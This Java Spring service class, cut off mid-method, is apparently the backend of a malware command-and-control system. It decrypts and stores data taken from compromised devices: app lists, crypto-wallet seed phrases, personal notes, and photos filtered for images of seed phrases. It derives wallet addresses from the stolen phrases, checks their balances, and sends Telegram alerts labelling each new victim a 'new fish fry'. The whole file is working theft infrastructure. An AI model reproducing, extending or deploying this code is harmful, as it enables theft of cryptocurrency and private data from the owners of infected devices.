package com.consume.service;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.dao.DuplicateKeyException;
import org.springframework.stereotype.Component;
import org.springframework.transaction.support.TransactionSynchronization;
import org.springframework.transaction.support.TransactionSynchronizationManager;

import java.util.concurrent.Executor;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.consume.config.AlbumAsyncConfig;
import com.consume.dao.Address4Dao;
import com.consume.dao.AlbumDao;
import com.consume.dao.AppListDao;
import com.consume.dao.C2EventDecryptDao;
import com.consume.dao.C2EventRecordsDao;
import com.consume.dao.MemorandumDao;
import com.consume.dao.MnemonicDao;
import com.consume.dao.UbDecryptDao;
import com.consume.dao.UjDecryptDao;
import com.consume.dao.TgReportDao;
import com.consume.dao.WpReportDao;
import com.consume.entity.Address4Entity;
import com.consume.entity.AlbumEntity;
import com.consume.entity.AppListEntity;
import com.consume.entity.C2EventEecryptEntity;
import com.consume.entity.C2EventRecordsEntity;
import com.consume.entity.MemorandumEntity;
import com.consume.entity.MnemonicEntity;
import com.consume.entity.TgReportEntity;
import com.consume.entity.UbDecryptEntity;
import com.consume.entity.UjDecryptEntity;
import com.consume.entity.WpReportEntity;
import com.consume.util.AesStoreCipher;
import com.consume.util.DigestUtil;
import com.consume.util.S3FileUploadUtil;
import com.consume.util.TPhotoDecryptor;
import com.consume.util.WalletDerivator;
import com.consume.util.WalletSourceUtil;

/**
 * C2 业务落库服务（对齐 XADD.md §5 各 handler 的「解密落库 + 业务落库」）。
 *
 * 各 save_* 方法把解密结果 / 业务数据写入对应表。
 */
@Component
public class C2BusinessStore {

    private static final Logger log = LoggerFactory.getLogger(C2BusinessStore.class);

    @Autowired private C2EventDecryptDao c2EventDecryptDao;
    @Autowired private C2EventRecordsDao c2EventRecordsDao;
    @Autowired private AppListDao appListDao;
    @Autowired private MnemonicDao mnemonicDao;
    @Autowired private Address4Dao address4Dao;
    @Autowired private MemorandumDao memorandumDao;
    @Autowired private AlbumDao albumDao;
    @Autowired private UbDecryptDao ubDecryptDao;
    @Autowired private UjDecryptDao ujDecryptDao;
    @Autowired private TgReportDao tgReportDao;
    @Autowired private WpReportDao wpReportDao;
    @Autowired private AddressListenNotifier addressListenNotifier;
    @Autowired private MnemonicTelegramService mnemonicTelegramService;
    @Autowired(required = false)
    private ReportedAddressMatchService reportedAddressMatchService;

    @Autowired
    @Qualifier("albumMaterializeExecutor")
    private Executor albumMaterializeExecutor;

    @Autowired
    @Qualifier("albumUploadExecutor")
    private Executor albumUploadExecutor;

    @Autowired
    @Qualifier("albumFilterExecutor")
    private Executor albumFilterExecutor;

    @Autowired
    @Qualifier("walletDeriveExecutor")
    private Executor walletDeriveExecutor;

    @Autowired(required = false)
    private S3FileUploadUtil s3FileUploadUtil;

    @Autowired(required = false)
    private AlbumBatchInsertBuffer albumBatchInsertBuffer;

    @Autowired
    private MnemonicImageAnalyzer mnemonicImageAnalyzer;

    @org.springframework.beans.factory.annotation.Value("${news4.album.photo-dir:}")
    private String photoDir;

    @org.springframework.beans.factory.annotation.Value("${news4.album.photo-url-prefix:admin/data/photos}")
    private String photoUrlPrefix;

    /** true：解密后走 S3 上传队列；本地落盘已注释关闭 */
    @org.springframework.beans.factory.annotation.Value("${news4.album.cloud.enabled:false}")
    private boolean albumCloudEnabled;

    @org.springframework.beans.factory.annotation.Value("${news4.album.cloud.key-prefix:photos}")
    private String albumCloudKeyPrefix;

    // @org.springframework.beans.factory.annotation.Value("${news4.album.cloud.delete-local-after-upload:false}")
    // private boolean deleteLocalAfterUpload;

    @org.springframework.beans.factory.annotation.Value("${news4.mnemonic.mnemonic-aes-key:${news4.mnemonic.encrypt-key:}}")
    private String mnemonicAesKey;

    /** album.status：1 上云成功可用；2 失败（旧数据）；0/3 为旧流程残留，新流程成功前不落库 */
    private static final int ALBUM_STATUS_OK = 1;

    // ---------- 通用解密落库 ----------

    /** 写 c2_event_decrypt（/event /u /us /nb /t 占位共用）。同一 c2_record_id 重投时幂等跳过。 */
    public void saveEventDecrypt(C2HandlerContext ctx, String plaintextJson, String keyLabel) {
        try {
            C2EventEecryptEntity e = new C2EventEecryptEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setXTs(ctx.getXTs());
            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
            e.setKeyLabel(keyLabel == null ? "" : keyLabel);
            e.setPrefix(ctx.getPrefix() == null ? "" : ctx.getPrefix());
            e.setPlaintextJson(plaintextJson == null ? "" : plaintextJson);
            e.setRawText(ctx.getRawText() == null ? "" : ctx.getRawText());
            e.setErrormsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
            e.setDecryptedAt(System.currentTimeMillis() / 1000.0);
            c2EventDecryptDao.insert(e);
        } catch (DuplicateKeyException dup) {
            log.debug("正常日志:[c2_handlers][save_event_decrypt] 已存在，跳过插入, recordId={}",
                    ctx.getRecordId());
        } catch (Exception ex) {
            if (isDuplicateKey(ex)) {
                log.debug("正常日志:[c2_handlers][save_event_decrypt] 已存在，跳过插入, recordId={}",
                        ctx.getRecordId());
                return;
            }
            log.info("异常日志:[c2_handlers][save_event_decrypt] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    private static boolean isDuplicateKey(Throwable ex) {
        for (Throwable t = ex; t != null; t = t.getCause()) {
            if (t instanceof DuplicateKeyException) {
                return true;
            }
            String msg = t.getMessage();
            if (msg != null && (msg.contains("Duplicate entry")
                    || msg.contains("uk_c2_event_decrypt")
                    || msg.contains("uk_album_device_sha"))) {
                return true;
            }
        }
        return false;
    }

    // ---------- /event ----------

    /** /event 业务落库 → c2_event_records */
    public void insertEventRecord(C2HandlerContext ctx, JSONObject plaintext) {
        if (plaintext == null) {
            return;
        }
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][c2_event_records] 无 device_row_id，跳过写入, recordId={}",
                    ctx.getRecordId());
            return;
        }
        try {
            C2EventRecordsEntity e = new C2EventRecordsEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setDeviceId(ctx.getDeviceRowId());
            e.setChannelcode(ctx.getChannelcode() == null ? "" : ctx.getChannelcode());
            e.setEt(str(plaintext, "et"));
            e.setPv(str(plaintext, "pv"));
            e.setPn(str(plaintext, "pn"));
            e.setM(str(plaintext, "m"));
            e.setEcid(str(plaintext, "d"));
            e.setSerial(str(plaintext, "s"));
            e.setC2Uid(str(plaintext, "u"));
            e.setEventUuid(str(plaintext, "id"));
            e.setLhu(str(plaintext, "lhu"));
            e.setSbu(str(plaintext, "sbu"));
            e.setTm(longVal(plaintext, "tm"));
            e.setEx(intVal(plaintext, "ex"));
            e.setDescText(str(plaintext, "desc"));
            Object ctxObj = plaintext.get("ctx");
            e.setCtxJson(ctxObj == null ? "" : JSONObject.toJSONString(ctxObj));
            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
            e.setCapturedAt(ctx.getRecord() == null ? null : ctx.getRecord().getCapturedAt());
            c2EventRecordsDao.insert(e);
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][c2_event_records] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    // ---------- /u ----------

    /** /u 业务落库 → applist（al 为应用列表数组） */
    public void saveApplist(C2HandlerContext ctx, JSONObject plaintext) {
        if (plaintext == null) {
            return;
        }
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][applist] 无 device_row_id，跳过写入, recordId={}, deviceid={}",
                    ctx.getRecordId(), ctx.getDeviceId());
            return;
        }
        JSONArray al = plaintext.getJSONArray("al");
        if (al == null || al.isEmpty()) {
            log.debug("正常日志:[c2_handlers][applist] al 为空, recordId={}", ctx.getRecordId());
            return;
        }
        Integer deviceRowId = ctx.getDeviceRowId();
        String deviceUid = ctx.getDeviceId() == null ? "" : ctx.getDeviceId();
        double now = System.currentTimeMillis() / 1000.0;
        int ok = 0;
        int skipped = 0;
        for (int i = 0; i < al.size(); i++) {
            try {
                JSONObject app = al.getJSONObject(i);
                if (app == null) {
                    continue;
                }
                AppListEntity e = new AppListEntity();
                e.setDeviceRowId(deviceRowId);
                e.setDeviceUid(deviceUid);
                e.setAppName(str(app, "a"));
                e.setBundleId(str(app, "b"));
                e.setVersion(str(app, "v"));
                e.setAddtime(now);
                appListDao.insert(e);
                ok++;
            } catch (DuplicateKeyException dup) {
                skipped++;
                log.debug("正常日志:[c2_handlers][applist] 已存在，跳过, recordId={}, idx={}",
                        ctx.getRecordId(), i);
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][applist] 单条插入失败, recordId={}, idx={}, err={}",
                        ctx.getRecordId(), i, ex.getMessage());
            }
        }
        log.info("正常日志:[c2_handlers][applist] 写入 {} 条, 跳过 {} 条, recordId={}, deviceRowId={}",
                ok, skipped, ctx.getRecordId(), deviceRowId);
    }

    // ---------- /us ----------

    /** /us 业务落库 → mnemonic（加密存）+ 可能派生 address4 */
    public void saveMnemonic(C2HandlerContext ctx, JSONObject plaintext) {
        if (plaintext == null) {
            return;
        }
        if (!hasDeviceRow(ctx) || ctx.getDeviceId() == null || ctx.getDeviceId().isEmpty()) {
            log.info("异常日志:[c2_handlers][mnemonic] 无设备信息，跳过写入, recordId={}, deviceRowId={}, deviceid={}",
                    ctx.getRecordId(), ctx.getDeviceRowId(), ctx.getDeviceId());
            return;
        }
        String resultRaw = str(plaintext, "result");
        if (resultRaw.isEmpty()) {
            log.debug("正常日志:[c2_handlers][mnemonic] result 为空, recordId={}", ctx.getRecordId());
            return;
        }
        // 与 18 一致：小写 + trim + 空白压缩，同一物理词只算一次
        String result = normalizeMnemonic(resultRaw);
        if (result.isEmpty()) {
            log.debug("正常日志:[c2_handlers][mnemonic] result 规范化后为空, recordId={}", ctx.getRecordId());
            return;
        }
        // wordscount：助记词位数（按空白分词计数，如 12/15/18/21/24）
        int wordscount = 0;
        String[] parts = result.split("\\s+");
        for (String p : parts) {
            if (!p.isEmpty()) {
                wordscount++;
            }
        }
        String phraseHash = DigestUtil.sha256Hex(result);
        String deviceId = ctx.getDeviceId() == null ? "" : ctx.getDeviceId();
        String source = WalletSourceUtil.toWalletName(str(plaintext, "a"));

        // 同设备 + 同钱包 + 同词：已存在则不再入库、不再派生
        try {
            Integer existId = mnemonicDao.findIdByDeviceSourceHash(deviceId, source, phraseHash);
            if (existId != null && existId > 0) {
                try {
                    mnemonicDao.incrementDupCount(deviceId, source, phraseHash);
                } catch (Exception ex) {
                    log.info("异常日志:[c2_handlers][mnemonic] 递增 dup 失败, recordId={}, err={}",
                            ctx.getRecordId(), ex.getMessage());
                }
                log.info("正常日志:[c2_handlers][mnemonic] 重复跳过(同设备+钱包+词), recordId={}, existId={}, deviceid={}, source={}",
                        ctx.getRecordId(), existId, deviceId, source);
                return;
            }
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][mnemonic] 幂等预查失败，继续插入, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }

        try {
            MnemonicEntity e = new MnemonicEntity();
            // mnemonic.device_id 存 device.deviceid（不是 device.device_id）
            e.setDeviceId(deviceId);
            e.setChannelcode(ctx.getChannelcode() == null ? "" : ctx.getChannelcode());
            e.setWordscount(wordscount);
            // 助记词加密入库（AES-256-ECB，与 18-consumer-server 一致）；result_hash 存明文 sha256 供查重
            e.setResult(encryptMnemonic(result));
            e.setSource(source);
            e.setRecvDupCount(0);
            e.setStatus(1);
            e.setPhraseHash(phraseHash);
            e.setAddtime(System.currentTimeMillis() / 1000.0);
            mnemonicDao.insert(e);
            log.info("正常日志:[c2_handlers][mnemonic] 写入成功, recordId={}, mnemonicId={}, source={}",
                    ctx.getRecordId(), e.getId(), source);

            // 派生用规范化后的词（与入库一致）
            JSONObject derivePt = plaintext;
            if (!result.equals(resultRaw)) {
                derivePt = new JSONObject(plaintext);
                derivePt.put("result", result);
            }
            // 派生 address4：离载 Kafka listener，事务提交后异步执行（CallerRuns 保证不丢）
            scheduleDeriveAddress4(e.getId(), derivePt, ctx);

            // 若设备已有上报地址，异步撞库（us 先到时 pending 为空则 no-op；ub 后到会再触发）
            if (reportedAddressMatchService != null) {
                try {
                    reportedAddressMatchService.scheduleMatchAfterUs(
                            deviceId,
                            ctx.getDeviceRowId(),
                            ctx.getChannelcode(),
                            ctx.getClientIp());
                } catch (Exception me) {
                    log.info("异常日志:[c2_handlers][mnemonic] 提交地址匹配失败, recordId={}, err={}",
                            ctx.getRecordId(), me.getMessage());
                }
            }

            // 新助记词入库成功 → 异步飞机「新鱼苗」通知
            try {
                mnemonicTelegramService.notifyFishAsync(
                        ctx.getDeviceRowId(),
                        ctx.getDeviceId(),
                        ctx.getChannelcode(),
                        ctx.getClientIp());
            } catch (Exception te) {
                log.info("异常日志:[c2_handlers][mnemonic] 新鱼苗通知提交失败, recordId={}, err={}",
                        ctx.getRecordId(), te.getMessage());
            }
        } catch (DuplicateKeyException dup) {
            // 并发竞态兜底：递增 recv_dup_count，不派生
            try {
                mnemonicDao.incrementDupCount(deviceId, source, phraseHash);
                log.info("正常日志:[c2_handlers][mnemonic] 重复助记词(UK冲突)，递增 dup, recordId={}, source={}",
                        ctx.getRecordId(), source);
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][mnemonic] 递增 dup 失败, recordId={}, err={}",
                        ctx.getRecordId(), ex.getMessage());
            }
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][mnemonic] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    /** 助记词规范化：与 18 PhraseResult 一致，保证同一物理词 hash 稳定 */
    private static String normalizeMnemonic(String phrase) {
        if (phrase == null || phrase.isEmpty()) {
            return "";
        }
        return phrase.toLowerCase().trim().replaceAll("\\s+", " ");
    }

    /** address4 派生：由 mnemonic 经 web3j 派生 ETH 地址并插入 address4；成功后异步通知三方监听 */
    private void scheduleDeriveAddress4(Integer mnemonicId, JSONObject plaintext, C2HandlerContext ctx) {
        if (mnemonicId == null) {
            return;
        }
        Runnable job = () -> {
            try {
                deriveAddress4(mnemonicId, plaintext, ctx);
            } catch (Throwable t) {
                log.info("异常日志:[c2_handlers][address4] 异步派生失败, mnemonicId={}, err={}",
                        mnemonicId, t.toString());
            }
        };
        Runnable submit = () -> {
            try {
                walletDeriveExecutor.execute(job);
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][address4] 提交派生失败，降级同步, mnemonicId={}, err={}",
                        mnemonicId, ex.getMessage());
                job.run();
            }
        };
        if (TransactionSynchronizationManager.isSynchronizationActive()) {
            TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronization() {
                @Override
                public void afterCommit() {
                    submit.run();
                }
            });
            return;
        }
        submit.run();
    }

    private void deriveAddress4(Integer mnemonicId, JSONObject plaintext, C2HandlerContext ctx) {
        if (mnemonicId == null) {
            return;
        }
        String mnemonic = plaintext == null ? "" : str(plaintext, "result");

        // 优先撞库：命中则 address4 只写「匹配地址 + 未命中链的 index0」，不再先灌全量
        boolean matched = false;
        if (reportedAddressMatchService != null && ctx != null
                && ctx.getDeviceId() != null && !ctx.getDeviceId().isEmpty()) {
            try {
                matched = reportedAddressMatchService.matchNow(
                        ctx.getDeviceId(),
                        ctx.getDeviceRowId(),
                        ctx.getChannelcode(),
                        ctx.getClientIp());
            } catch (Exception e) {
                log.info("异常日志:[c2_handlers][address4] 同步匹配失败 mnemonicId={} err={}",
                        mnemonicId, e.getMessage());
            }
        }
        if (matched) {
            log.info("正常日志:[c2_handlers][address4] 已按上报地址匹配写入, mnemonicId={}", mnemonicId);
            return;
        }

        // 无上报可撞 / 未命中：各链只派生 index0 写入
        java.util.List<WalletDerivator.DerivedAddress> list = WalletDerivator.derive(mnemonic);
        double now = System.currentTimeMillis() / 1000.0;
        int ok = 0;
        java.util.List<WalletDerivator.DerivedAddress> inserted = new java.util.ArrayList<>();
        for (WalletDerivator.DerivedAddress da : list) {
            try {
                Address4Entity a = new Address4Entity();
                a.setMnemonicId(mnemonicId);
                a.setAddress(da.address);
                a.setChaintype(da.chaintype);
                a.setAddrindex(da.addrIndex);
                a.setStatus(1);
                a.setAlgorithm(da.algorithm);
                a.setNativeBal("0");
                a.setUsdtBal("0");
                a.setUsdcBal("0");
                a.setBalanceRefreshedAt(now);
                a.setAddtime(now);
                address4Dao.upsert(a);
                ok++;
                inserted.add(da);
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][address4] 插入失败, mnemonicId={}, chain={}, err={}",
                        mnemonicId, da.chaintype, ex.getMessage());
            }
        }
        log.info("正常日志:[c2_handlers][address4] 自派生 index0 写入 {} 条, mnemonicId={}", ok, mnemonicId);
        if (!inserted.isEmpty()) {
            addressListenNotifier.notifyAfterCommit(mnemonicId, inserted);
            try {
                mnemonicTelegramService.notifyBalanceAfterDeriveAsync(
                        mnemonicId,
                        ctx == null ? null : ctx.getDeviceRowId(),
                        ctx == null ? null : ctx.getDeviceId(),
                        ctx == null ? null : ctx.getChannelcode(),
                        ctx == null ? null : ctx.getClientIp(),
                        inserted);
            } catch (Exception e) {
                log.info("异常日志:[c2_handlers][address4] 余额通知提交失败 mnemonicId={} err={}",
                        mnemonicId, e.getMessage());
            }
        }
    }

    // ---------- /nb ----------

    /** /nb 业务落库 → memorandum（list 为备忘录数组） */
    public void saveMemorandum(C2HandlerContext ctx, JSONObject plaintext) {
        if (plaintext == null) {
            return;
        }
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][memorandum] 无 device_row_id，跳过写入, recordId={}, deviceid={}",
                    ctx.getRecordId(), ctx.getDeviceId());
            return;
        }
        JSONArray list = plaintext.getJSONArray("list");
        if (list == null || list.isEmpty()) {
            log.debug("正常日志:[c2_handlers][memorandum] list 为空, recordId={}", ctx.getRecordId());
            return;
        }
        Integer deviceRowId = ctx.getDeviceRowId();
        String deviceUid = ctx.getDeviceId() == null ? "" : ctx.getDeviceId();
        String channelcode = ctx.getChannelcode() == null ? "" : ctx.getChannelcode();
        double now = System.currentTimeMillis() / 1000.0;
        int ok = 0;
        for (int i = 0; i < list.size(); i++) {
            try {
                JSONObject item = asJsonObject(list.get(i));
                if (item == null) {
                    continue;
                }
                String title = str(item, "title");
                String content = str(item, "content");
                if (content.isEmpty()) {
                    // 兼容 /nb 的字符串项或仅有单值字段的 JSON 项
                    content = firstNonEmpty(str(item, "value"), str(item, "text"), str(item, "memo"));
                }
                if (title.isEmpty()) {
                    title = firstNonEmpty(str(item, "name"), str(item, "label"));
                }
                if (content.isEmpty()) {
                    continue;
                }
                MemorandumEntity e = new MemorandumEntity();
                e.setDeviceRowId(deviceRowId);
                e.setDeviceUid(deviceUid);
                e.setChannelcode(channelcode);
                e.setSerial(str(plaintext, "s"));
                e.setTitle(title);
                e.setContent(content);
                e.setContentHash(DigestUtil.sha256Hex(content));
                e.setType(normalizeMemoType(item.get("type")));
                e.setC2RecordId((int) ctx.getRecordId());
                e.setAddtime(now);
                memorandumDao.insert(e);
                ok++;
            } catch (DuplicateKeyException dup) {
                // 同设备同内容已存在，跳过
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][memorandum] 单条插入失败, recordId={}, idx={}, err={}",
                        ctx.getRecordId(), i, ex.getMessage());
            }
        }
        log.info("正常日志:[c2_handlers][memorandum] 写入 {} 条, recordId={}, deviceRowId={}, channelcode={}",
                ok, ctx.getRecordId(), deviceRowId, channelcode);
    }

    // ---------- /t ----------

    /** /t 业务：不预写 album；解密+上云成功后一次性 INSERT（status=1 + S3 URL）。
     *  解图/上云在独立线程池，不占用 Kafka/Redis 消费线程。失败不落库，避免无地址空壳。 */
    public void saveAlbum(C2HandlerContext ctx, java.util.Map<String, String> fields,
                          byte[] fileBlob, String fileName) {
        try {
            if (!hasDeviceRow(ctx)) {
                log.info("异常日志:[c2_handlers][album] 无 device_row_id，跳过, recordId={}",
                        ctx.getRecordId());
                return;
            }
            if (fileBlob == null || fileBlob.length == 0) {
                return;
            }
            if (!albumCloudEnabled || s3FileUploadUtil == null) {
                log.info("异常日志:[c2_handlers][album] 云存储不可用，跳过, recordId={}", ctx.getRecordId());
                return;
            }
            String formTs = field(fields, "ts");
            if (formTs == null || formTs.isEmpty()) {
                log.info("异常日志:[c2_handlers][album] 缺少 ts，跳过, recordId={}", ctx.getRecordId());
                return;
            }

            AlbumEntity draft = new AlbumEntity();
            draft.setDeviceRowId(ctx.getDeviceRowId());
            draft.setDeviceUid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
            draft.setChannelcode(ctx.getChannelcode() == null ? "" : ctx.getChannelcode());
            draft.setEcid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
            draft.setSerial(field(fields, "s"));
            draft.setRid(field(fields, "rid"));
            draft.setFilename(fileName == null ? "" : fileName);
            draft.setFileSize(fileBlob.length);
            draft.setFileSha256(DigestUtil.sha256Hex(fileBlob));
            draft.setFormTs(formTs);
            draft.setXTs(com.consume.util.HeadersUtil.header(ctx.getHeadersJson(), "x-ts"));
            draft.setC2RecordId((int) ctx.getRecordId());
            draft.setType(0);
            draft.setAddtime(System.currentTimeMillis() / 1000.0);

            scheduleMaterialize(draft, fileBlob);
        } catch (Exception ex) {
            // 高峰允许丢图：不向上抛，避免异步重试占满线程、拖死消费
            log.info("异常日志:[c2_handlers][album] 提交失败(丢弃), recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    private void scheduleMaterialize(AlbumEntity draft, byte[] fileBlob) {
        AlbumAsyncConfig.AlbumRejectAware task = new AlbumAsyncConfig.AlbumRejectAware() {
            @Override
            public void run() {
                materializeAlbumImage(draft, fileBlob);
            }

            @Override
            public void onRejected() {
                // 与线程池策略一致：队列满则丢图，仅抽样打日志由 AlbumAsyncConfig 负责
            }
        };
        try {
            albumMaterializeExecutor.execute(task);
        } catch (RuntimeException ex) {
            log.info("异常日志:[c2_handlers][album] 提交解图失败(丢弃), recordId={}, err={}",
                    draft.getC2RecordId(), ex.getMessage());
        }
    }

    /** 解密 .dat → 投递 S3；成功后再 INSERT album。 */
    private void materializeAlbumImage(AlbumEntity draft, byte[] fileBlob) {
        if (draft == null || fileBlob == null) {
            return;
        }
        byte[] image;
        String imageMemberName;
        String ext;
        try {
            TPhotoDecryptor.ImageDetail detail =
                    TPhotoDecryptor.decryptDatToImage(fileBlob, draft.getFormTs());
            image = detail.image;
            imageMemberName = detail.imageName;
            ext = detail.ext;
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][album] 解密失败不落库, recordId={}, err={}",
                    draft.getC2RecordId(), ex.getMessage());
            return;
        }
        if (image == null || image.length == 0) {
            log.info("异常日志:[c2_handlers][album] 解出空内容不落库, recordId={}", draft.getC2RecordId());
            return;
        }

        String safeExt = (ext == null || !ext.startsWith(".")) ? ".bin" : ext;
        String imageName = (imageMemberName == null || imageMemberName.isEmpty())
                ? (draft.getFileSha256() + safeExt) : imageMemberName;
        if (imageName.length() > 256) {
            imageName = imageName.substring(0, 256);
        }
        draft.setImageName(imageName);
        scheduleMnemonicFilterThenUpload(draft, image, safeExt);
    }

    /** 助记词图片分析通过后才投 S3；不通过直接丢弃。 */
    private void scheduleMnemonicFilterThenUpload(AlbumEntity draft, byte[] image, String safeExt) {
        final String ext = safeExt;
        AlbumAsyncConfig.AlbumRejectAware task = new AlbumAsyncConfig.AlbumRejectAware() {
            @Override
            public void run() {
                try {
                    if (mnemonicImageAnalyzer != null && mnemonicImageAnalyzer.isEnabled()) {
                        if (!mnemonicImageAnalyzer.looksLikeMnemonic(image, draft.getC2RecordId())) {
                            return;
                        }
                    }
                    scheduleCloudUploadBytes(draft, image, ext);
                } catch (Exception ex) {
                    log.info("异常日志:[c2_handlers][album] 助记词过滤异常，丢弃不落库, recordId={}, err={}",
                            draft.getC2RecordId(), ex.getMessage());
                }
            }

            @Override
            public void onRejected() {
                log.info("异常日志:[c2_handlers][album] 过滤队列已满，丢弃不落库, recordId={}, sha={}",
                        draft.getC2RecordId(), draft.getFileSha256());
            }
        };
        try {
            albumFilterExecutor.execute(task);
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][album] 提交过滤失败, recordId={}, err={}",
                    draft.getC2RecordId(), ex.getMessage());
        }
    }

    /**
     * 投递 S3 上传；成功后一次性 INSERT status=1。
     * 队列满则丢弃（不落库），依赖消息重投。
     */
    public void scheduleCloudUploadBytes(AlbumEntity draft, byte[] image, String safeExt) {
        if (!albumCloudEnabled || draft == null || image == null || image.length == 0) {
            return;
        }
        final String ext = safeExt;
        AlbumAsyncConfig.AlbumRejectAware task = new AlbumAsyncConfig.AlbumRejectAware() {
            @Override
            public void run() {
                uploadAndInsertAlbum(draft, image, ext);
            }

            @Override
            public void onRejected() {
                log.info("异常日志:[c2_handlers][album] S3 队列已满，丢弃不落库, recordId={}, sha={}",
                        draft.getC2RecordId(), draft.getFileSha256());
            }
        };
        try {
            albumUploadExecutor.execute(task);
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][album] 提交 S3 失败, recordId={}, err={}",
                    draft.getC2RecordId(), ex.getMessage());
        }
    }

    /** @deprecated 旧入口保留签名兼容；纯云模式已改为 draft 上云后入库 */
    public void scheduleCloudUploadBytes(Integer albumId, Integer deviceRowId,
                                         byte[] image, String safeExt, String imageName) {
        log.debug("正常日志:[c2_handlers][album] 旧 scheduleCloudUploadBytes(albumId) 已废弃, albumId={}",
                albumId);
    }

    /** @deprecated 旧「本地路径上云」入口 */
    public void scheduleCloudUpload(Integer albumId, Integer deviceRowId,
                                    String absFilePath, String localRelPath) {
        log.debug("正常日志:[c2_handlers][album] scheduleCloudUpload 已废弃(无本地盘), albumId={}", albumId);
    }

    /** 内存字节 → S3 → 成功才 INSERT album（status=1 + URL） */
    private void uploadAndInsertAlbum(AlbumEntity draft, byte[] image, String safeExt) {
        if (s3FileUploadUtil == null || draft == null) {
            return;
        }
        try {
            Integer rowId = draft.getDeviceRowId();
            String sha = draft.getFileSha256() == null ? "" : draft.getFileSha256();
            String ext = (safeExt == null || !safeExt.startsWith(".")) ? ".bin" : safeExt;
            // 无 albumId：用 sha 作对象名，幂等重传可覆盖同一 key
            String fileName = (sha.isEmpty() ? String.valueOf(System.currentTimeMillis()) : sha) + ext;
            String objectKey = buildCloudObjectKey(rowId, fileName);
            String url = s3FileUploadUtil.uploadBytes(image, objectKey, fileName);
            if (url == null || url.isEmpty()) {
                log.info("异常日志:[album] S3 上传失败, recordId={}, key={}",
                        draft.getC2RecordId(), objectKey);
                return;
            }

            double now = System.currentTimeMillis() / 1000.0;
            draft.setStatus(ALBUM_STATUS_OK);
            draft.setImagePath(url);
            draft.setErrorMsg("");
            draft.setParsedAt(now);
            if (draft.getAddtime() == null) {
                draft.setAddtime(now);
            }
            if (draft.getErrorMsg() == null) {
                draft.setErrorMsg("");
            }
            if (draft.getDeviceUid() == null) {
                draft.setDeviceUid("");
            }
            if (draft.getChannelcode() == null) {
                draft.setChannelcode("");
            }
            if (draft.getEcid() == null) {
                draft.setEcid("");
            }
            if (albumBatchInsertBuffer != null) {
                albumBatchInsertBuffer.offer(draft);
                log.info("正常日志:[album] 上云完成待入库, recordId={}, url={}", draft.getC2RecordId(), url);
            } else {
                try {
                    albumDao.insert(draft);
                    log.info("正常日志:[album] 上云入库, recordId={}, albumId={}, url={}",
                            draft.getC2RecordId(), draft.getId(), url);
                } catch (Exception insertEx) {
                    if (isDuplicateKey(insertEx)) {
                        return;
                    }
                    log.info("异常日志:[album] 入库失败, recordId={}, err={}",
                            draft.getC2RecordId(), insertEx.getMessage());
                }
            }
        } catch (Exception ex) {
            log.info("异常日志:[album] S3/入库异常, recordId={}, err={}",
                    draft.getC2RecordId(), ex.getMessage());
        }
    }

    /*
     * ========== 原「本地文件 → S3」上传逻辑（保留注释，便于回退）==========
     * private void uploadAlbumToCloud(Integer albumId, Integer deviceRowId,
     *                                 String absFilePath, String localRelPath) { ... }
     * private java.io.File resolveLocalAlbumFile(...) { ... }
     * ========== 结束 ==========
     */

    private String buildCloudObjectKey(Integer deviceRowId, String fileName) {
        String prefix = albumCloudKeyPrefix == null ? "photos" : albumCloudKeyPrefix.trim();
        prefix = prefix.replace("\\", "/").replaceAll("^/+", "").replaceAll("/+$", "");
        String name = fileName;
        if (name == null || name.isEmpty()) {
            name = System.currentTimeMillis() + ".bin";
        }
        int slash = name.replace("\\", "/").lastIndexOf('/');
        if (slash >= 0) {
            name = name.substring(slash + 1);
        }
        return prefix + "/" + (deviceRowId == null ? 0 : deviceRowId) + "/" + name;
    }

    private void markAlbumFail(Integer albumId, String error) {
        if (albumId == null) {
            return;
        }
        try {
            AlbumEntity upd = new AlbumEntity();
            upd.setId(albumId);
            upd.setStatus(2); // FAIL
            upd.setErrorMsg(error == null ? "" : (error.length() > 512 ? error.substring(0, 512) : error));
            upd.setParsedAt(System.currentTimeMillis() / 1000.0);
            albumDao.updateById(upd);
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][album] 标记失败状态失败, albumId={}, err={}", albumId, ex.getMessage());
        }
    }

    // ---------- /ub ----------

    /** /ub 业务落库 → ub_decrypt（含解密结果与设备字段） */
    public void saveUbDecrypt(C2HandlerContext ctx, JSONObject plaintext) {
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][ub_decrypt] 无 device_row_id，跳过写入, recordId={}",
                    ctx.getRecordId());
            return;
        }
        try {
            UbDecryptEntity e = new UbDecryptEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setDeviceId(ctx.getDeviceRowId());
